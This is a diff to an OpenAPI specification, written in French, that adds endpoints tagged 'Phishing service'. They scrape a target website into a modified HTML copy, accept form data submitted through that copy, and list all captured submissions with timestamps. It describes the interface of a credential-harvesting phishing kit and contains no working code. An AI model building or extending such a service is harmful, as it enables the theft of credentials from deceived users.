@@ -338,7 +338,7 @@
       "get": {
         "summary": "Verify an email address",
         "tags": [
-          "Features"
+          "Feature - Email Existence"
         ],
         "parameters": [
           {
@@ -483,8 +483,228 @@
           }
         }
       }
+    },
+    "/": {
+      "get": {
+        "summary": "Scraper un site et générer un fichier HTML modifié",
+        "tags": [
+          "Feature - Phishing service"
+        ],
+        "parameters": [
+          {
+            "in": "query",
+            "name": "url",
+            "required": true,
+            "description": "URL du site à scraper",
+            "schema": {
+              "type": "string",
+              "format": "uri"
+            }
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "Fichier HTML généré avec succès",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "type": "object",
+                  "properties": {
+                    "message": {
+                      "type": "string",
+                      "description": "Message de succès avec l'emplacement du fichier généré"
+                    },
+                    "info": {
+                      "type": "string",
+                      "description": "L'URL pour récupérer les données soumises"
+                    }
+                  }
+                }
+              }
+            }
+          },
+          "400": {
+            "description": "L'URL est requise",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "type": "object",
+                  "properties": {
+                    "message": {
+                      "type": "string"
+                    }
+                  }
+                }
+              }
+            }
+          },
+          "500": {
+            "description": "Erreur lors du scraping du site",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "type": "object",
+                  "properties": {
+                    "message": {
+                      "type": "string"
+                    }
+                  }
+                }
+              }
+            }
+          }
+        }
+      },
+      "post": {
+        "summary": "Soumettre les données d'un formulaire",
+        "tags": [
+          "Feature - Phishing service"
+        ],
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "schema": {
+                "type": "object",
+                "properties": {
+                  "site": {
+                    "type": "string",
+                    "description": "L'URL du site"
+                  },
+                  "[ autres champs du formulaire ]": {
+                    "type": "string",
+                    "description": "Autres données soumises par l'utilisateur"
+                  }
+                }
+              }
+            }
+          }
+        },
+        "responses": {
+          "200": {
+            "description": "Données reçues avec succès",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "type": "object",
+                  "properties": {
+                    "message": {
+                      "type": "string",
+                      "description": "Message de succès"
+                    },
+                    "submission": {
+                      "type": "object",
+                      "description": "Données soumises"
+                    }
+                  }
+                }
+              }
+            }
+          },
+          "400": {
+            "description": "Aucune donnée valide trouvée dans le formulaire",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "type": "object",
+                  "properties": {
+                    "error": {
+                      "type": "string"
+                    }
+                  }
+                }
+              }
+            }
+          },
+          "500": {
+            "description": "Erreur lors de la soumission des données",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "type": "object",
+                  "properties": {
+                    "error": {
+                      "type": "string"
+                    }
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    },
+    "/datas": {
+      "get": {
+        "summary": "Récupérer toutes les soumissions de formulaires",
+        "tags": [
+          "Feature - Phishing service"
+        ],
+        "responses": {
+          "200": {
+            "description": "Liste des soumissions récupérées avec succès",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "type": "array",
+                  "items": {
+                    "type": "object",
+                    "properties": {
+                      "site": {
+                        "type": "string",
+                        "description": "L'URL du site"
+                      },
+                      "[ autres champs du formulaire ]": {
+                        "type": "string",
+                        "description": "Autres données soumises"
+                      },
+                      "timestamp": {
+                        "type": "string",
+                        "format": "date-time",
+                        "description": "Horodatage de la soumission"
+                      }
+                    }
+                  }
+                }
+              }
+            }
+          },
+          "404": {
+            "description": "Aucune soumission trouvée",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "type": "object",
+                  "properties": {
+                    "message": {
+                      "type": "string"
+                    }
+                  }
+                }
+              }
+            }
+          },
+          "500": {
+            "description": "Erreur lors de la récupération des données",
+            "content": {
+              "application/json": {
+                "schema": {
+                  "type": "object",
+                  "properties": {
+                    "error": {
+                      "type": "string"
+                    }
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
     }
   },
-  "components": {},
+  "components": {
+
+  },
   "tags": []
 }
